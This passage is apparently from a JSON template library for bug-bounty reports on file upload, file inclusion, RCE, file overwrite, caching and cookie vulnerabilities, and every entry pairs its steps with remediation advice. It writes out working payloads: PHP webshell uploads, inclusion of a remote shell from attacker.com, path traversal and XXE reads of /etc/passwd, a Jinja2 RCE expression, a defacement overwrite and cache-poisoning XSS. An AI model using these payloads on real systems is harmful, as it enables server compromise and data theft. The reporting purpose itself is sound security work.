                    "notes": "Provide the malicious file's content and its intended extension. Show the request used to upload it. Provide the URL of the uploaded file and a screenshot or output demonstrating successful remote code execution (e.g., `ls -la` command output). For DoS, show server logs indicating resource exhaustion or the application becoming unresponsive."
                  },
                  "impact": "Remote Code Execution (RCE), leading to full server compromise, data exfiltration, and persistent access. Denial of Service (DoS) by filling up disk space or consuming CPU/memory. Malware distribution. This is often a critical vulnerability.",
                  "remediation_suggestion": "Implement strict server-side validation for file uploads: whitelist allowed file extensions (e.g., `.jpg`, `.png`, `.pdf`) and reject all others. Perform robust content-type validation (both MIME type and actual file content using 'magic bytes'). Store uploaded files outside the web root directory. If files must be served, rename them to prevent execution and remove executable permissions. Implement strict file size limits. Scan uploaded files for malware. When dealing with archives, validate content and size after decompression."
                },
                {
                  "vulnerability_name": "File Upload Without Validation",
                  "summary": "File Upload Without Validation is a specific instance of the File Upload vulnerability where the application accepts files with arbitrary extensions or content types, enabling attackers to upload malicious files like webshells or malware.",
                  "severity": "Critical",
                  "target": "[Specify affected asset, e.g., cdn.example.com]",
                  "url_location": "[Full URL of the file upload endpoint, e.g., https://cdn.example.com/user_media/upload]",
                  "steps_to_reproduce": [
                    "1. Identify a file upload endpoint.",
                    "2. Prepare a simple webshell file (e.g., `test.php` containing `<?php echo 'Hello from ' . php_uname(); ?>` for PHP, or `test.jsp` for Java).",
                    "3. Attempt to upload this file directly.",
                    "4. **[Scenario A: No Extension Validation]**",
                    "   a. Upload `shell.php`.",
                    "   b. **[What happened]**: The server accepts the `.php` file, and it becomes accessible via a web URL.",
                    "   c. **[What should happen]**: Only explicitly whitelisted extensions should be allowed.",
                    "5. **[Scenario B: Only Client-Side Validation]**",
                    "   a. The application's JavaScript might prevent uploading `.php` files.",
                    "   b. Bypass this by intercepting the request (e.g., with Burp Suite) and changing the filename extension from `image.jpg` to `shell.php` and/or the `Content-Type` from `image/jpeg` to `application/x-php`.",
                    "   c. **[What happened]**: The server, lacking its own validation, accepts the manipulated file.",
                    "   d. **[What should happen]**: All validation must be performed server-side.",
                    "6. **[Scenario C: No Content-Type Validation]**",
                    "   a. Upload a PHP webshell file, but set its `Content-Type` header to `image/jpeg`.",
                    "   b. **[What happened]**: The server trusts the `Content-Type` header and processes the PHP file as if it were an image, then stores it. If the server is configured to execute `.php` files regardless of Content-Type, RCE is achieved.",
                    "   c. **[What should happen]**: Content-Type must be validated (using magic bytes for true file type, not just header).",
                    "7. Navigate to the uploaded file's URL to confirm execution (e.g., `https://cdn.example.com/user_media/uploads/shell.php`)."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST /user_media/upload HTTP/1.1\nHost: cdn.example.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n<?php system($_GET['cmd']); ?>\n------WebKitFormBoundary7MA4YWxkTrZu0gW--",
                    "notes": "Provide the malicious file's content and the exact HTTP request used for upload. Show the URL of the uploaded file. Include screenshots or a video demonstrating successful remote code execution from the uploaded file."
                  },
                  "impact": "Remote Code Execution (RCE), leading to complete server compromise. This is a critical vulnerability that bypasses security controls and allows an attacker to run arbitrary code on the hosting server.",
                  "remediation_suggestion": "Implement a strict server-side whitelist for allowed file extensions. Never rely solely on client-side validation. Verify the actual file content (using 'magic bytes' or content analysis) in addition to the MIME type. Store uploaded files outside the web root or in a non-executable directory. Rename uploaded files to random, non-executable names. Scan uploaded files for malware. Apply least privilege to the directory where files are uploaded."
                },
                {
                  "vulnerability_name": "File Inclusion/Path Traversal",
                  "summary": "File Inclusion/Path Traversal vulnerabilities allow an attacker to read arbitrary files on the server (Local File Inclusion - LFI) or even execute arbitrary code (Remote File Inclusion - RFI) by manipulating input that is used to construct file paths or include external files.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Any endpoint processing file paths, e.g., https://app.example.com/load_template?file=]",
                  "steps_to_reproduce": [
                    "1. Identify an endpoint that takes a file path or filename as input (e.g., `file=`, `template=`, `page=`, `image=`).",
                    "2. **[Scenario A: Local File Inclusion (LFI) via Path Traversal]**",
                    "   a. Attempt to read a sensitive local file using path traversal sequences (`../`) and common system file paths. Example: `https://app.example.com/load_template?file=../../../../etc/passwd` (Linux) or `../../../../windows/win.ini` (Windows).",
                    "   b. Try null byte injection (`%00`) to bypass extension filtering: `https://app.example.com/load_template?file=../../../../etc/passwd%00.jpg`.",
                    "   c. **[What happened]**: The content of the `passwd` file (or other system files) is displayed in the application's response.",
                    "   d. **[What should happen]**: Input should be strictly sanitized, and path traversal sequences should be stripped or rejected.",
                    "3. **[Scenario B: Remote File Inclusion (RFI)]**",
                    "   a. If the application dynamically includes files from external sources (e.g., `include($_GET['file'])` in PHP).",
                    "   b. Create a malicious script (e.g., `shell.txt` with `<?php system($_GET['cmd']); ?>`) on an attacker-controlled server (`http://attacker.com/shell.txt`).",
                    "   c. Provide the URL of the malicious script as input: `https://app.example.com/load_template?file=http://attacker.com/shell.txt`.",
                    "   d. **[What happened]**: The application includes and executes the remote script, allowing RCE.",
                    "   e. **[What should happen]**: Remote file inclusion should be disabled (e.g., `allow_url_include=Off` in PHP).",
                    "4. **[Scenario C: Log Poisoning (combining LFI with log file access)]**",
                    "   a. Inject a malicious payload into a log file (e.g., by sending a request with an XSS or PHP payload in the User-Agent header, which is often logged).",
                    "   b. Use LFI to include the log file: `https://app.example.com/load_template?file=../../../../var/log/apache2/access.log`.",
                    "   c. **[What happened]**: The injected payload in the log file is executed when included by the vulnerable application."
                  ],
                  "proof_of_concept": {
                    "url_example": "https://app.example.com/load_template?file=../../../../etc/passwd",
                    "notes": "Provide the exact vulnerable URL and the file path attempted. Include a screenshot of the sensitive file's contents displayed in the web application's response. For RFI, provide the URL of the remote malicious file and evidence of its execution (e.g., command output)."
                  },
                  "impact": "Local File Inclusion: Sensitive data exposure (credentials, configuration files, source code). Remote File Inclusion: Remote Code Execution (RCE), leading to full server compromise. Can lead to privilege escalation and persistent access. This is a severe vulnerability for both data confidentiality and system integrity.",
                  "remediation_suggestion": "Implement strict input validation and sanitization for all file paths or filenames. Never use user input directly to construct file paths. Use a whitelist of allowed file names or paths. Strip or reject path traversal sequences (`../`). Disable Remote File Inclusion in server configurations (e.g., `allow_url_include=Off` for PHP). Store sensitive files outside the web root and apply strict file permissions. Use a secure file inclusion mechanism that does not rely on user-controlled paths."
                },
                {
                  "vulnerability_name": "Content-Type Bypass in Uploads",
                  "summary": "Content-Type Bypass in Uploads occurs when an application validates file uploads based solely on the `Content-Type` header, but fails to verify the actual file content (magic bytes). An attacker can easily spoof the `Content-Type` header, allowing them to upload malicious files with executable extensions, even if the filename extension is superficially limited.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., images.example.com]",
                  "url_location": "[Full URL of the file upload endpoint, e.g., https://images.example.com/upload_avatar]",
                  "steps_to_reproduce": [
                    "1. Identify a file upload endpoint that seems to only accept certain image types (e.g., `image/jpeg`, `image/png`).",
                    "2. Prepare a malicious file (e.g., a PHP webshell `shell.php`) that *does not* have valid image magic bytes. For example: `<?php system($_GET['cmd']); ?>`.",
                    "3. Attempt to upload this file. It will likely be blocked client-side or server-side based on its `.php` extension or incorrect `Content-Type`.",
                    "4. Intercept the upload request (e.g., with Burp Suite).",
                    "5. Change the filename extension from `.php` to an allowed image extension (e.g., `shell.jpg`).",
                    "6. Change the `Content-Type` header from `application/x-php` to an allowed image MIME type (e.g., `image/jpeg`).",
                    "7. **[What happened]**: The server accepts the file because it only checked the spoofed `Content-Type` header and the 'allowed' extension. The file, despite being a PHP script, is stored as `shell.jpg`.",
                    "8. **[What should happen]**: The server should verify the actual file content's 'magic bytes' to determine its true type, not just trust the `Content-Type` header.",
                    "9. If the server is configured to execute files based on content or if an include vulnerability exists, attempt to execute the uploaded file (e.g., `https://images.example.com/uploads/shell.jpg` if the server's PHP handler executes `.jpg`s containing PHP code, or if an LFI vulnerability can include this file)."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST /upload_avatar HTTP/1.1\nHost: images.example.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"avatar\"; filename=\"shell.jpg\"\nContent-Type: image/jpeg\n\n<?php system($_GET['cmd']); ?>\n------WebKitFormBoundary7MA4YWxkTrZu0gW--",
                    "notes": "Provide the exact request used to bypass the `Content-Type` validation. Show the contents of the malicious file. Demonstrate that the file was successfully uploaded. If RCE is achieved, provide the URL of the uploaded file and a screenshot of the command output."
                  },
                  "impact": "Remote Code Execution (RCE) if the uploaded file can be executed on the server. Denial of Service (DoS) if large or malicious files can be uploaded and stored. Can be used as a stepping stone to further attacks. This bypasses a common file upload security control.",
                  "remediation_suggestion": "Never rely solely on the `Content-Type` header or filename extension for file validation. Always verify the actual file content by checking its 'magic bytes' or performing image parsing (for image uploads). Implement a strict server-side whitelist for allowed file types and extensions. Store uploaded files outside the web root and ensure they do not have executable permissions. Rename files to random, non-executable names after upload."
                },
                {
                  "vulnerability_name": "Local File Read via File Picker",
                  "summary": "Local File Read via File Picker (also known as File System Access API abuse, though often refers to more general browser file picker vulnerabilities) occurs when an application misuses the HTML5 File API or related browser features (e.g., `<input type=\"file\">` combined with JavaScript) to read arbitrary local files from the victim's file system, rather than just the file explicitly selected by the user, leading to sensitive data exposure.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., webapp.example.com]",
                  "url_location": "[Any page with a file picker, e.g., https://webapp.example.com/upload_document]",
                  "steps_to_reproduce": [
                    "1. Identify a page that uses a file picker (e.g., `<input type=\"file\">`) and processes the selected file using JavaScript (e.g., for previewing, uploading).",
                    "2. **[Scenario A: Symbolic Link / Shortcut Traversal]**",
                    "   a. On your local machine, create a symbolic link (symlink) or a Windows shortcut (.LNK file) that points to a sensitive file outside the intended upload directory (e.g., a symlink named `my_photo.jpg` pointing to `/etc/passwd`).",
                    "   b. In the browser, use the file picker to select this symlink/shortcut.",
                    "   c. **[What happened]**: The application's JavaScript reads the content of the *target* file (`/etc/passwd`) and displays it or attempts to upload it, rather than treating the symlink itself as the file.",
                    "   d. **[What should happen]**: Browsers should typically abstract away symlinks and only provide the selected file's content, but vulnerabilities can arise if the browser's file API or the application's handling allows traversal.",
                    "3. **[Scenario B: Insufficient Validation in JavaScript Readers]**",
                    "   a. If the JavaScript logic for reading files uses methods that can be tricked into reading beyond the selected file or from unexpected paths (less common in modern browsers but historically seen). This might involve manipulating paths if client-side code builds paths based on user input.",
                    "   b. **[What happened]**: The application inadvertently reads contents of local files not explicitly selected by the user.",
                    "   c. **[What should happen]**: JavaScript file readers should be strictly sandboxed to the selected file content.",
                    "4. **[Scenario C: Browser-Specific Vulnerabilities]**",
                    "   a. Test with different browsers and versions, as some browser-specific flaws might allow this.",
                    "   b. **[What happened]**: A specific browser's File API implementation has a bug that allows reading arbitrary local files."
                  ],
                  "proof_of_concept": {
                    "notes": "Clearly describe the steps, including how the symlink/shortcut was created locally. Provide a screenshot of the application displaying the contents of the sensitive local file (e.g., `/etc/passwd`). Explain the browser, OS, and application JavaScript version used. Emphasize that this requires victim interaction (selecting the malicious file)."
                  },
                  "impact": "Sensitive data exposure from the victim's local file system (e.g., SSH keys, configuration files, personal documents, browser data). This can lead to account takeover, system compromise, or privacy violations. Requires user interaction but can be highly impactful.",
                  "remediation_suggestion": "This is primarily a browser/OS interaction vulnerability. For the application: 1. Ensure file processing JavaScript strictly operates on the `File` object provided by the browser's file picker, not on constructed paths. 2. Treat all file content received from the client as untrusted and perform rigorous server-side validation. 3. Be aware of browser-specific vulnerabilities related to file handling and ensure users are on patched versions. 4. If sensitive local data is being handled, ensure it's handled in a secure, isolated manner (e.g., Web Workers, secure sandboxed environments)."

              },
              {
                  "vulnerability_name": "Remote Code Execution (RCE)",
                  "summary": "Remote Code Execution (RCE) allows an attacker to execute arbitrary commands or code on the server where the application is hosted. This is typically achieved by exploiting vulnerabilities like Command Injection, Deserialization, Server-Side Template Injection, or insecure file uploads, leading to full system compromise.",
                  "severity": "Critical",
                  "target": "[Specify affected asset, e.g., webserver.example.com]",
                  "url_location": "[Full URL of the vulnerable endpoint, e.g., https://webserver.example.com/admin/execute_command]",
                  "steps_to_reproduce": [
                    "1. Identify a vulnerability that can lead to RCE (e.g., Command Injection, Deserialization, SSTI, unrestricted file upload).",
                    "2. **[Scenario A: RCE via Command Injection]**",
                    "   a. In a vulnerable parameter (e.g., `cmd=`), inject an OS command. Example: `cmd=127.0.0.1;id`.",
                    "   b. **[What happened]**: The `id` command is executed on the server, and its output is reflected in the response.",
                    "   c. **[What should happen]**: Input should be sanitized to prevent command execution.",
                    "3. **[Scenario B: RCE via Deserialization]**",
                    "   a. Craft a malicious serialized object (e.g., Java Ysoserial payload) that executes a system command (e.g., `calc.exe`, `rm -rf /`).",
                    "   b. Send this payload to a vulnerable deserialization endpoint.",
                    "   c. **[What happened]**: The command is executed on the server.",
                    "   d. **[What should happen]**: Untrusted deserialization should be prevented.",
                    "4. **[Scenario C: RCE via Server-Side Template Injection (SSTI)]**",
                    "   a. Inject a template expression that calls a system command. Example (Jinja2): `{{ ''.__class__.__mro__[2].__subclasses__()[40]('id').read() }}`.",
                    "   b. **[What happened]**: The `id` command is executed, and its output appears in the rendered page.",
                    "   c. **[What should happen]**: Template engines should be sandboxed.",
                    "5. **[Scenario D: RCE via Unrestricted File Upload]**",
                    "   a. Upload a webshell (e.g., `shell.php`) to a web-accessible directory.",
                    "   b. Access the webshell via URL and execute commands (e.g., `https://webserver.example.com/uploads/shell.php?cmd=whoami`).",
                    "   c. **[What happened]**: The `whoami` command is executed, and its output is displayed.",
                    "   d. **[What should happen]**: Executable files should not be uploaded or placed in web-accessible directories."
                  ],
                  "proof_of_concept": {
                    "request_example": "GET /api/execute?cmd=id HTTP/1.1\nHost: webserver.example.com",
                    "response_example": "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
                    "notes": "Clearly specify the underlying vulnerability (e.g., 'This RCE is a result of Command Injection'). Provide the exact payload and the HTTP request/response demonstrating command execution. Include screenshots of the command output or any observed side effects on the server."
                  },
                  "impact": "Complete compromise of the server, allowing an attacker to execute arbitrary code, access sensitive files, install malware, pivot to other internal systems, and gain full control over the affected machine and potentially the entire infrastructure. This is the highest severity vulnerability.",
                  "remediation_suggestion": "Implement strict input validation and sanitization for all user-supplied data. Avoid executing OS commands directly with user input. Use parameterized queries for database interactions. Configure deserialization processes to only accept trusted data. Implement secure file upload policies (whitelisting, content validation, storing outside web root). Use sandboxed environments for template rendering. Regularly patch and update all software components."
                },
                {
                  "vulnerability_name": "Arbitrary File Overwrite",
                  "summary": "Arbitrary File Overwrite allows an attacker to write or replace arbitrary files on the server's file system. This is typically achieved by exploiting flaws in file upload functionalities, path traversal vulnerabilities, or insecure file handling, leading to denial of service, remote code execution, or defacement.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., fileserver.example.com]",
                  "url_location": "[Full URL of the vulnerable endpoint, e.g., https://fileserver.example.com/upload_config]",
                  "steps_to_reproduce": [
                    "1. Identify an endpoint that allows file uploads or file creation, where the filename or path can be controlled by user input.",
                    "2. **[Scenario A: Overwriting Web Content]**",
                    "   a. Craft a simple HTML file (e.g., `index.html`) with a defacement message.",
                    "   b. Use a path traversal payload to target a web-accessible file (e.g., `filename=../../../../var/www/html/index.html` or `filename=../../../../htdocs/index.php`).",
                    "   c. Upload the crafted file using the vulnerable endpoint.",
                    "   d. **[What happened]**: The application overwrites the legitimate `index.html` (or `index.php`) file, and navigating to the root URL shows the defacement message.",
                    "   e. **[What should happen]**: The application should prevent writing outside designated directories and validate file paths.",
                    "3. **[Scenario B: Overwriting Configuration Files]**",
                    "   a. Craft a malicious configuration file (e.g., `database.yml` with attacker-controlled database credentials, or `web.config` to enable debug mode).",
                    "   b. Use a path traversal payload to target a known configuration file path (e.g., `filename=../../../../app/config/database.yml`).",
                    "   c. Upload the malicious config file.",
                    "   d. **[What happened]**: The application overwrites the configuration file, potentially leading to unauthorized database access or other system changes.",
                    "   e. **[What should happen]**: Configuration files should be protected from external write access.",
                    "4. **[Scenario C: Overwriting Executables (leading to RCE)]**",
                    "   a. Craft a malicious executable file (e.g., a `.dll`, `.exe`, or `.so` file) or a script (e.g., `.php`, `.jsp`).",
                    "   b. Attempt to overwrite a legitimate executable or script used by the application.",
                    "   c. **[What happened]**: The malicious file replaces the legitimate one, and when executed by the server, it leads to RCE.",
                    "   d. **[What should happen]**: Executable directories should not be writable by the application's user, and file types should be strictly validated."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST /upload_file HTTP/1.1\nHost: fileserver.example.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../var/www/html/index.html\"\nContent-Type: text/html\n\n<html><body><h1>Hacked!</h1></body></html>\n------WebKitFormBoundary7MA4YWxkTrZu0gW--",
                    "notes": "Provide the exact request used to upload the file, the filename, and its content. Show the URL where the overwritten file is visible (e.g., the defaced homepage). Include screenshots of the defacement or evidence of the configuration change/RCE."
                  },
                  "impact": "Remote Code Execution (RCE) if executable files are overwritten. Denial of Service (DoS) by corrupting or deleting critical application files. Website defacement. Data manipulation by altering configuration files. This is a severe vulnerability that can lead to complete system compromise.",
                  "remediation_suggestion": "Implement strict server-side validation for all file uploads and file creation operations. Never allow user-supplied input to directly control file paths or names. Prevent path traversal sequences (`../`). Store uploaded files in dedicated, non-web-accessible directories with non-executable permissions. Implement file system permissions (least privilege) to prevent the web application user from writing to sensitive directories. Perform content validation (magic bytes) to ensure the file type matches its intended purpose."
                },
                {
                  "vulnerability_name": "Local File Read (Server-Side)",
                  "summary": "Local File Read (Server-Side) allows an attacker to read arbitrary files from the server's file system. This is typically achieved by exploiting vulnerabilities like Path Traversal, Local File Inclusion (LFI), or XXE, leading to sensitive data disclosure.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Full URL of the vulnerable endpoint, e.g., https://app.example.com/view_log?file=]",
                  "steps_to_reproduce": [
                    "1. Identify an endpoint that takes a file path or filename as input, and the application attempts to read and display its content.",
                    "2. **[Scenario A: Path Traversal / LFI]**",
                    "   a. Inject path traversal sequences (`../`) to access files outside the intended directory. Example: `https://app.example.com/view_log?file=../../../../etc/passwd` (Linux) or `../../../../windows/win.ini` (Windows).",
                    "   b. Try null byte injection (`%00`) to bypass extension filtering: `https://app.example.com/view_log?file=../../../../etc/passwd%00.log`.",
                    "   c. **[What happened]**: The content of the `/etc/passwd` file (or other specified system/application files) is displayed in the application's response.",
                    "   d. **[What should happen]**: Input should be strictly sanitized, and path traversal sequences should be stripped or rejected. File access should be confined to a specific, safe directory.",
                    "3. **[Scenario B: XXE (External Entity Inclusion)]**",
                    "   a. If the application processes XML input, inject an XXE payload that attempts to read a local file. Example: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>`.",
                    "   b. **[What happened]**: The XML parser reads the file, and its content is reflected in the application's response or an error message.",
                    "   c. **[What should happen]**: XML parsers should be configured to disable external entity resolution.",
                    "4. **[Scenario C: SSRF (to file:// scheme)]**",
                    "   a. If an SSRF vulnerability exists, and the `file://` scheme is permitted, use it to read local files. Example: `https://app.example.com/image_proxy?url=file:///etc/passwd`.",
                    "   b. **[What happened]**: The server fetches and returns the content of the local file.",
                    "   c. **[What should happen]**: SSRF filters should block `file://` scheme and other internal access."
                  ],
                  "proof_of_concept": {
                    "url_example": "https://app.example.com/view_log?file=../../../../etc/passwd",
                    "notes": "Provide the exact vulnerable URL and the file path attempted. Include a screenshot of the sensitive file's contents displayed in the web application's response. Clearly state the underlying vulnerability (e.g., 'This Local File Read is a result of Path Traversal')."
                  },
                  "impact": "Sensitive data disclosure, including credentials, configuration files, source code, and other confidential information stored on the server. This can lead to further attacks like privilege escalation, account takeover, or complete system compromise.",
                  "remediation_suggestion": "Implement strict input validation for all file paths or filenames. Never use user input directly to construct file paths. Use a whitelist of allowed file names or paths. Strip or reject path traversal sequences (`../`). Store sensitive files outside the web root and apply strict file permissions. Configure XML parsers to disable external entity resolution. Implement SSRF protections to block `file://` and other internal schemes."
                },
                {
                  "vulnerability_name": "Cache Poisoning/Cache Deception",
                  "summary": "Cache Poisoning allows an attacker to store a malicious response in a web cache (e.g., CDN, proxy server), which is then served to other legitimate users. Cache Deception tricks a cache into storing sensitive user-specific data on a shared cache, making it accessible to an attacker.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., cdn.example.com]",
                  "url_location": "[Any endpoint served by a cache, e.g., https://cdn.example.com/static/js/app.js]",
                  "steps_to_reproduce": [
                    "1. Identify an application that uses a web cache (e.g., CDN, reverse proxy).",
                    "2. **[Scenario A: Cache Poisoning (via Unkeyed Input)]**",
                    "   a. Find a parameter that influences the server's response but is *not* included in the cache key (e.g., a custom header, a rarely used query parameter).",
                    "   b. Send a request with a malicious payload in this unkeyed parameter (e.g., `X-Custom-Header: <script>alert(1)</script>`).",
                    "   c. **[What happened]**: The cache stores the malicious response (containing the XSS payload, for example) based on the URL *without* considering the unkeyed parameter. Subsequent requests from other users for the same URL receive the poisoned response, leading to XSS.",
                    "   d. **[What should happen]**: All parameters that influence the response should be included in the cache key, or their values should be sanitized.",
                    "3. **[Scenario B: Cache Deception]**",
                    "   a. Identify a page that serves sensitive user-specific content (e.g., `https://example.com/profile`).",
                    "   b. Append a non-existent path or file extension to the URL that the cache might strip or ignore, but the backend still processes. Example: `https://example.com/profile/nonexistent.jpg` or `https://example.com/profile/index.php/attacker.css`.",
                    "   c. **[What happened]**: The cache stores the sensitive user-specific content (e.g., the victim's profile page) under the `nonexistent.jpg` URL. An attacker can then request `https://example.com/profile/nonexistent.jpg` and retrieve the victim's cached sensitive data.",
                    "   d. **[What should happen]**: Caches should not store private content, and URLs should be canonicalized before caching.",
                    "4. **[Scenario C: HTTP Response Splitting (leading to Cache Poisoning)]**",
                    "   a. (Already covered under CRLF Injection) If CRLF injection leads to HTTP Response Splitting, the attacker can inject a new HTTP response (e.g., with malicious content) that the cache then stores under the original URL."
                  ],
                  "proof_of_concept": {
                    "request_example": "GET /static/js/app.js HTTP/1.1\nHost: cdn.example.com\nX-Injected-Header: <script>alert(document.domain)</script>",
                    "notes": "Provide the exact request used to poison/deceive the cache. Show evidence that the cache was poisoned (e.g., subsequent requests from different browsers/incognito windows receive the malicious content). For Cache Deception, show the request to the 'deceived' URL and the sensitive data returned. A video demonstrating the poisoning and subsequent victim access is highly effective."
                  },
                  "impact": "Web Cache Poisoning: Widespread Cross-Site Scripting (XSS) affecting all users served by the cache. Website defacement. Redirection to malicious sites. Web Cache Deception: Sensitive data exposure (e.g., PII, session tokens, private documents) of individual users to attackers. Both can lead to reputational damage and data breaches.",
                  "remediation_suggestion": "Ensure all parameters that influence the response (including headers) are included in the cache key. Implement strict input validation and encoding for all user-supplied input that might be reflected in a cached response. For Cache Deception, configure caches to explicitly *not* cache private or user-specific content. Implement `Cache-Control: private` or `no-store` for sensitive pages. Canonicalize URLs before caching. Regularly audit cache configurations and monitor for suspicious caching behavior."
                },
                {
                  "vulnerability_name": "Insecure Caching of Sensitive Data",
                  "summary": "Insecure Caching of Sensitive Data occurs when an application or its caching infrastructure (e.g., browser cache, proxy cache, CDN) stores sensitive user-specific information (e.g., PII, financial data, session tokens) in a way that makes it accessible to unauthorized individuals, often due to misconfigured `Cache-Control` headers or improper handling of private data.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., secure.example.com]",
                  "url_location": "[Full URL of the page containing sensitive data, e.g., https://secure.example.com/my_account/details]",
                  "steps_to_reproduce": [
                    "1. Log in to the application and navigate to a page containing sensitive user-specific data (e.g., profile details, order history, financial statements).",
                    "2. **[Scenario A: Missing/Incorrect Cache-Control Headers]**",
                    "   a. Inspect the HTTP response headers for the page. Look for `Cache-Control` headers.",
                    "   b. **[What happened]**: The `Cache-Control` header is missing, or set to `public`, `max-age`, or `s-maxage` without `private` or `no-store`. This allows intermediate proxies or shared caches to store the sensitive content.",
                    "   c. **[What should happen]**: Sensitive content should be served with `Cache-Control: no-store, no-cache, must-revalidate, private` to prevent caching by any intermediary or browser.",
                    "3. **[Scenario B: Sensitive Data in Browser Cache]**",
                    "   a. After viewing a sensitive page, close the browser, clear browsing data (excluding cache), and then reopen the browser and navigate back to the sensitive URL.",
                    "   b. **[What happened]**: The browser loads the sensitive content directly from its local cache without re-authenticating or fetching from the server, meaning the data persists locally even after logout or session expiry.",
                    "   c. **[What should happen]**: Sensitive data should not be stored in the browser's persistent cache.",
                    "4. **[Scenario C: Sensitive Data in Back/Forward Cache (BF Cache)]**",
                    "   a. (Covered separately, but related) If sensitive data is in the BF Cache, it can be accessed via browser history.",
                    "5. **[Scenario D: Shared Cache Leakage (e.g., CDN)]**",
                    "   a. If a CDN is used, and `Cache-Control: public` is set on a sensitive page, another user might receive a cached version of the victim's sensitive data if the cache key is not sufficiently granular (e.g., not including user ID).",
                    "   b. **[What happened]**: Sensitive user A's data is served to user B from the CDN cache.",
                    "   c. **[What should happen]**: CDNs should be configured not to cache private content, or cache keys should be unique per user."
                  ],
                  "proof_of_concept": {
                    "response_header_example": "HTTP/1.1 200 OK\nContent-Type: text/html\nCache-Control: public, max-age=3600",
                    "notes": "Provide the URL of the page containing sensitive data. Show the HTTP response headers for that page, highlighting the problematic `Cache-Control` directive. Explain how the sensitive data is exposed (e.g., 'This allows the user's full name and address to be cached by public proxies'). Screenshots of the browser cache or network tab showing cached content are helpful."
                  },
                  "impact": "Sensitive data exposure to unauthorized individuals, especially if the user accesses the application on a shared computer or if intermediate caches are compromised. Leads to privacy violations, identity theft, and compliance failures.",
                  "remediation_suggestion": "Implement strict `Cache-Control` headers for all pages containing sensitive data. For highly sensitive content, use `Cache-Control: no-store, no-cache, must-revalidate, private`. For less sensitive but still private content, use `Cache-Control: private, no-cache, must-revalidate`. Ensure that all sensitive data is properly invalidated from caches upon user logout or session expiry. Configure CDNs and proxies to never cache private content. Use HTTPS exclusively to prevent caching by transparent HTTP proxies."
                },
                {
                  "vulnerability_name": "Sensitive Data in Back/Forward Cache",
                  "summary": "Sensitive Data in Back/Forward Cache (BF Cache) occurs when a web page containing sensitive user-specific information is stored in the browser's BF Cache. This allows the sensitive data to be viewed by anyone with access to the browser's history, even after the user has logged out or their session has expired, simply by using the browser's back/forward buttons.",
                  "severity": "Medium",
                  "target": "[Specify affected asset, e.g., banking.example.com]",
                  "url_location": "[Full URL of the page with sensitive data, e.g., https://banking.example.com/account_summary]",
                  "steps_to_reproduce": [
                    "1. Log in to the application and navigate to a page displaying sensitive user-specific data (e.g., account balance, transaction history, personal details).",
                    "2. Navigate to another page within the application, or an external page, using a regular link (not a new tab).",
                    "3. Perform a logout action on the application, or wait for the session to expire.",
                    "4. Use the browser's 'Back' button to navigate back to the sensitive page.",
                    "5. **[What happened]**: The browser displays the sensitive data from the BF Cache, even though the user is logged out or the session has expired. The page is loaded instantly without a network request.",
                    "6. **[What should happen]**: Sensitive pages should prevent caching in the BF Cache, or their content should be invalidated upon logout/session expiry.",
                    "7. **[Scenario B: History Manipulation]**",
                    "   a. If the application uses `history.pushState` or `history.replaceState` insecurely, it might leave sensitive data in the history that can be accessed by the back button."
                  ],
                  "proof_of_concept": {
                    "notes": "Provide the URL of the sensitive page. Describe the navigation steps (login, view sensitive page, navigate away, logout, use back button). Include a screenshot or video demonstrating the sensitive data being visible after logout/session expiry, without a network request (check network tab in dev tools)."
                  },
                  "impact": "Sensitive data exposure to unauthorized individuals who gain access to the browser (e.g., on a shared computer, or if the user leaves their device unlocked). Leads to privacy violations and potential for identity theft.",
                  "remediation_suggestion": "For pages containing sensitive data, use `Cache-Control: no-store` in the HTTP response headers. This prevents the browser from storing the page in any cache, including the BF Cache. Alternatively, for very sensitive pages, consider using server-side redirects (`302 Found`) after logout or when the session expires to ensure the browser fetches a fresh, non-cached version. Implement JavaScript to clear sensitive data from the DOM or force a reload on `pageshow` event if the page is loaded from BF Cache (less reliable than `no-store`)."
                },
                {
                  "vulnerability_name": "Cookies Hacking",
                  "summary": "Cookies Hacking refers to various techniques used by attackers to exploit vulnerabilities related to HTTP cookies, leading to session hijacking, authentication bypass, or sensitive data exposure. This includes issues like missing security flags, predictable cookie values, or insecure cookie handling.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Any page setting/using cookies, e.g., https://app.example.com/login]",
                  "steps_to_reproduce": [
                    "1. Log in to the application and inspect all cookies set by the application (browser developer tools -> Application -> Cookies).",
                    "2. **[Scenario A: Missing HttpOnly Flag]**",
                    "   a. Check if the session cookie (or any cookie containing sensitive data) is missing the `HttpOnly` flag.",
                    "   b. Open the browser's JavaScript console and try to access the cookie: `document.cookie`.",
                    "   c. **[What happened]**: The cookie value is accessible via JavaScript, making it vulnerable to XSS attacks (an XSS payload could steal this cookie).",
                    "   d. **[What should happen]**: All session and sensitive cookies should have the `HttpOnly` flag set.",
                    "3. **[Scenario B: Missing Secure Flag]**",
                    "   a. Check if the session cookie is missing the `Secure` flag.",
                    "   b. **[What happened]**: The cookie can be transmitted over unencrypted HTTP connections, making it vulnerable to passive network sniffing (Man-in-the-Middle attacks).",
                    "   c. **[What should happen]**: All session and sensitive cookies should have the `Secure` flag set, ensuring they are only sent over HTTPS.",
